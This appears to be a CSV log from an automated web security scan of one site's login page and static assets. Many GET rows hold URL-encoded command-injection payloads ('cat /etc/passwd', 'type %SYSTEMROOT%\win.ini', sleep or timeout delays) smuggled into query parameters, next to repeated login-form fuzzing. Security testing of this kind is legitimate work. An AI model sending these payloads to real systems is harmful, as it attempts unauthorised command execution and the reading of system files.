Id,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
3238,Tue Aug 31 11:26:59 WAT 2021,Tue Aug 31 11:26:59 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,140,415,10510
3239,Tue Aug 31 11:26:59 WAT 2021,Tue Aug 31 11:26:59 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,269,255,23152
3240,Tue Aug 31 11:26:59 WAT 2021,Tue Aug 31 11:26:59 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,266,255,23152
3241,Tue Aug 31 11:26:59 WAT 2021,Tue Aug 31 11:27:00 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,376,255,23152
3242,Tue Aug 31 11:27:00 WAT 2021,Tue Aug 31 11:27:00 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,262,255,23152
3243,Tue Aug 31 11:26:58 WAT 2021,Tue Aug 31 11:27:00 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,2364,349,347412
3244,Tue Aug 31 11:27:00 WAT 2021,Tue Aug 31 11:27:00 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,258,255,23152
3245,Tue Aug 31 11:27:00 WAT 2021,Tue Aug 31 11:27:01 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,395,255,23152
3246,Tue Aug 31 11:27:01 WAT 2021,Tue Aug 31 11:27:01 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,552,255,23152
3247,Tue Aug 31 11:27:01 WAT 2021,Tue Aug 31 11:27:01 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,265,255,23152
3248,Tue Aug 31 11:27:01 WAT 2021,Tue Aug 31 11:27:02 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,264,255,23152
3249,Tue Aug 31 11:27:02 WAT 2021,Tue Aug 31 11:27:02 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,268,255,23152
3250,Tue Aug 31 11:27:02 WAT 2021,Tue Aug 31 11:27:02 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,275,255,23152
3251,Tue Aug 31 11:27:02 WAT 2021,Tue Aug 31 11:27:02 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,268,255,23152
3252,Tue Aug 31 11:27:02 WAT 2021,Tue Aug 31 11:27:03 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,261,255,23152
3253,Tue Aug 31 11:27:00 WAT 2021,Tue Aug 31 11:27:03 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,2922,349,347412
3254,Tue Aug 31 11:27:03 WAT 2021,Tue Aug 31 11:27:03 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,283,255,23152
3255,Tue Aug 31 11:27:03 WAT 2021,Tue Aug 31 11:27:03 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,391,255,23152
3256,Tue Aug 31 11:27:03 WAT 2021,Tue Aug 31 11:27:04 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,269,255,23152
3257,Tue Aug 31 11:27:04 WAT 2021,Tue Aug 31 11:27:04 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,265,255,23152
3258,Tue Aug 31 11:27:04 WAT 2021,Tue Aug 31 11:27:04 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,277,255,23152
3259,Tue Aug 31 11:27:04 WAT 2021,Tue Aug 31 11:27:04 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,262,255,23152
3260,Tue Aug 31 11:27:04 WAT 2021,Tue Aug 31 11:27:05 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,266,255,23152
3261,Tue Aug 31 11:27:05 WAT 2021,Tue Aug 31 11:27:05 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,270,255,23152
3262,Tue Aug 31 11:27:05 WAT 2021,Tue Aug 31 11:27:05 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,144,255,23152
3263,Tue Aug 31 11:27:05 WAT 2021,Tue Aug 31 11:27:05 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,268,255,23152
3264,Tue Aug 31 11:27:03 WAT 2021,Tue Aug 31 11:27:05 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,2522,349,347412
3265,Tue Aug 31 11:27:05 WAT 2021,Tue Aug 31 11:27:06 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,267,255,23152
3266,Tue Aug 31 11:27:06 WAT 2021,Tue Aug 31 11:27:06 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,269,255,23152
3267,Tue Aug 31 11:27:06 WAT 2021,Tue Aug 31 11:27:06 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,262,255,23152
3268,Tue Aug 31 11:27:06 WAT 2021,Tue Aug 31 11:27:06 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,278,255,23152
3269,Tue Aug 31 11:27:06 WAT 2021,Tue Aug 31 11:27:07 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,276,255,23152
3270,Tue Aug 31 11:27:07 WAT 2021,Tue Aug 31 11:27:07 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,263,255,23152
3271,Tue Aug 31 11:27:07 WAT 2021,Tue Aug 31 11:27:07 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,274,255,23152
3272,Tue Aug 31 11:27:05 WAT 2021,Tue Aug 31 11:27:07 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,2089,349,347412
3273,Tue Aug 31 11:27:07 WAT 2021,Tue Aug 31 11:27:08 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,301,255,23152
3274,Tue Aug 31 11:27:08 WAT 2021,Tue Aug 31 11:27:08 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,272,255,23152
3275,Tue Aug 31 11:27:08 WAT 2021,Tue Aug 31 11:27:08 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,129,236,0
3276,Tue Aug 31 11:27:08 WAT 2021,Tue Aug 31 11:27:08 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,128,236,0
3277,Tue Aug 31 11:27:08 WAT 2021,Tue Aug 31 11:27:08 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,141,236,0
3278,Tue Aug 31 11:27:08 WAT 2021,Tue Aug 31 11:27:08 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,125,236,0
3279,Tue Aug 31 11:27:08 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,126,236,0
3280,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,124,236,0
3281,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,122,236,0
3282,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,136,236,0
3283,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,126,236,0
3284,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,122,236,0
3285,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,130,236,0
3286,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:09 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,127,236,0
3287,Tue Aug 31 11:27:09 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,136,236,0
3288,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,128,236,0
3289,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,136,236,0
3290,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,130,236,0
3291,Tue Aug 31 11:27:07 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%26sleep+15%26,200,OK,2671,349,347412
3292,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,429,236,0
3293,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:10 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,125,236,0
3294,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,128,236,0
3295,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,125,236,0
3296,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,124,236,0
3297,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,123,236,0
3298,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,136,236,0
3299,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,127,236,0
3300,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:11 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,129,236,0
3301,Tue Aug 31 11:27:11 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,125,236,0
3302,Tue Aug 31 11:27:12 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,121,236,0
3303,Tue Aug 31 11:27:12 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,125,236,0
3304,Tue Aug 31 11:27:12 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,126,236,0
3305,Tue Aug 31 11:27:12 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,122,236,0
3306,Tue Aug 31 11:27:12 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,127,236,0
3307,Tue Aug 31 11:27:12 WAT 2021,Tue Aug 31 11:27:12 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,128,236,0
3308,Tue Aug 31 11:27:13 WAT 2021,Tue Aug 31 11:27:13 WAT 2021,GET,https://ibrokang.com/assets/images,404,Not Found,125,234,0
3309,Tue Aug 31 11:27:14 WAT 2021,Tue Aug 31 11:27:14 WAT 2021,GET,https://ibrokang.com/assets/img,404,Not Found,128,234,0
3310,Tue Aug 31 11:27:10 WAT 2021,Tue Aug 31 11:27:14 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%3Bsleep+15%3B,200,OK,3843,349,347412
3311,Tue Aug 31 11:27:14 WAT 2021,Tue Aug 31 11:27:15 WAT 2021,GET,https://ibrokang.com/assets/js,404,Not Found,120,234,0
3312,Tue Aug 31 11:27:15 WAT 2021,Tue Aug 31 11:27:15 WAT 2021,GET,https://ibrokang.com/assets/js/core,404,Not Found,119,234,0
3313,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%26cat+%2Fetc%2Fpasswd%26,200,OK,130,362,10636
3314,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/plugins,404,Not Found,132,234,0
3315,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,120,362,10636
3316,Tue Aug 31 11:27:14 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22%26sleep+15%26%22,200,OK,2051,349,347412
3317,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,126,362,10636
3318,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,121,362,10636
3319,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,121,362,10636
3320,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:16 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,127,362,10636
3321,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:17 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%26sleep+15%26,200,OK,128,362,10636
3322,Tue Aug 31 11:27:17 WAT 2021,Tue Aug 31 11:27:17 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%3Bsleep+15%3B,200,OK,120,362,10636
3323,Tue Aug 31 11:27:17 WAT 2021,Tue Aug 31 11:27:17 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%26sleep+15%26%22,200,OK,121,362,10636
3324,Tue Aug 31 11:27:17 WAT 2021,Tue Aug 31 11:27:17 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%3Bsleep+15%3B%22,200,OK,122,362,10636
3325,Tue Aug 31 11:27:17 WAT 2021,Tue Aug 31 11:27:17 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%26sleep+15%26%27,200,OK,119,362,10636
3326,Tue Aug 31 11:27:17 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%3Bsleep+15%3B%27,200,OK,533,362,10636
3327,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,121,362,10636
3328,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,118,362,10636
3329,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,123,362,10636
3330,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,123,362,10636
3331,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,119,362,10636
3332,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,122,362,10636
3333,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:18 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%26timeout+%2FT+15,200,OK,125,362,10636
3334,Tue Aug 31 11:27:18 WAT 2021,Tue Aug 31 11:27:19 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%7Ctimeout+%2FT+15,200,OK,116,362,10636
3335,Tue Aug 31 11:27:16 WAT 2021,Tue Aug 31 11:27:19 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22%3Bsleep+15%3B%22,200,OK,2528,349,347412
3336,Tue Aug 31 11:27:19 WAT 2021,Tue Aug 31 11:27:19 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%26timeout+%2FT+15%26%22,200,OK,759,362,10636
3337,Tue Aug 31 11:27:19 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%7Ctimeout+%2FT+15,200,OK,235,362,10636
3338,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%26timeout+%2FT+15%26%27,200,OK,119,362,10636
3339,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%7Ctimeout+%2FT+15,200,OK,119,362,10636
3340,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%3Bget-help,200,OK,120,362,10636
3341,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%3Bget-help,200,OK,117,362,10636
3342,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%3Bget-help,200,OK,130,362,10636
3343,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%3Bget-help+%23,200,OK,123,362,10636
3344,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:20 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%3Bstart-sleep+-s+15,200,OK,125,362,10636
3345,Tue Aug 31 11:27:19 WAT 2021,Tue Aug 31 11:27:21 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27%26sleep+15%26%27,200,OK,1920,349,347412
3346,Tue Aug 31 11:27:20 WAT 2021,Tue Aug 31 11:27:21 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%22%3Bstart-sleep+-s+15,200,OK,121,362,10636
3347,Tue Aug 31 11:27:21 WAT 2021,Tue Aug 31 11:27:21 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%27%3Bstart-sleep+-s+15,200,OK,119,362,10636
3348,Tue Aug 31 11:27:21 WAT 2021,Tue Aug 31 11:27:21 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=1.0.1%3Bstart-sleep+-s+15+%23,200,OK,121,362,10636
3349,Tue Aug 31 11:27:21 WAT 2021,Tue Aug 31 11:27:23 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27%3Bsleep+15%3B%27,200,OK,2772,349,347412
3350,Tue Aug 31 11:27:24 WAT 2021,Tue Aug 31 11:27:24 WAT 2021,GET,https://ibrokang.com/assets/plugins,404,Not Found,147,234,0
3351,Tue Aug 31 11:27:24 WAT 2021,Tue Aug 31 11:27:25 WAT 2021,GET,https://ibrokang.com/assets/plugins/bootstrap,404,Not Found,118,234,0
3352,Tue Aug 31 11:27:23 WAT 2021,Tue Aug 31 11:27:25 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,1704,349,347412
3353,Tue Aug 31 11:27:26 WAT 2021,Tue Aug 31 11:27:26 WAT 2021,GET,https://ibrokang.com/assets/plugins/owl-carousel,404,Not Found,124,234,0
3354,Tue Aug 31 11:27:25 WAT 2021,Tue Aug 31 11:27:26 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,1096,349,347412
3355,Tue Aug 31 11:27:26 WAT 2021,Tue Aug 31 11:27:26 WAT 2021,GET,https://ibrokang.com/assets/plugins/themify,404,Not Found,123,234,0
3356,Tue Aug 31 11:27:27 WAT 2021,Tue Aug 31 11:27:27 WAT 2021,GET,https://ibrokang.com/css,404,Not Found,122,234,0
3357,Tue Aug 31 11:27:27 WAT 2021,Tue Aug 31 11:27:27 WAT 2021,GET,https://ibrokang.com/Home,302,Found,123,294,0
3358,Tue Aug 31 11:27:27 WAT 2021,Tue Aug 31 11:27:27 WAT 2021,GET,https://ibrokang.com/js,404,Not Found,122,234,0
3359,Tue Aug 31 11:27:26 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,1573,349,347412
3360,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%26cat+%2Fetc%2Fpasswd%26,200,OK,121,359,35
3361,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,126,359,35
3362,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,121,359,35
3363,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,121,359,35
3364,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,126,359,35
3365,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:28 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,119,359,35
3366,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%26sleep+15%26,200,OK,118,359,35
3367,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%3Bsleep+15%3B,200,OK,120,359,35
3368,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%22%26sleep+15%26%22,200,OK,126,359,35
3369,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%22%3Bsleep+15%3B%22,200,OK,205,359,35
3370,Tue Aug 31 11:27:28 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,1328,349,347412
3371,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%27%26sleep+15%26%27,200,OK,121,359,35
3372,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%27%3Bsleep+15%3B%27,200,OK,121,359,35
3373,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,119,359,35
3374,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:29 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,121,359,35
3375,Tue Aug 31 11:27:29 WAT 2021,Tue Aug 31 11:27:30 WAT 2021,GET,https://ibrokang.com/js/site.js?v=ji3-IxbEzYWjzzLCGkF1KDjrT2jLbbrSYXw-AhMPNIA%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,128,359,35
